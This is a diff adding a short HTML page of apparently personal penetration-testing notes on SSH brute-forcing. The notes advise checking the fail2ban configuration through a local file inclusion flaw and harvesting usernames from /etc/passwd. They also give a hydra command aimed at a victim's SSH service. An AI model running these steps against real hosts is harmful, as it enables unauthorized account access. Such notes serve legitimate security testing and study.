@@ -1,0 +1,23 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>ssh - bruteforce</title>
+</head><body>Note:<br/>
+look at block prevent before bruteforce ssh<br/>
+<br/>
+<b>if have LFI check this</b><br/>
+<br/>
+/etc/fail2ban/fail2ban.conf<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+requirements:<br/>
+1. list users from /etc/passwd<br/>
+2. list possible password<br/>
+<br/>
+<br/>
+hydra -L users -P pw ssh://&lt;ip victim&gt;<br/>
+<br/>
+</body></html>
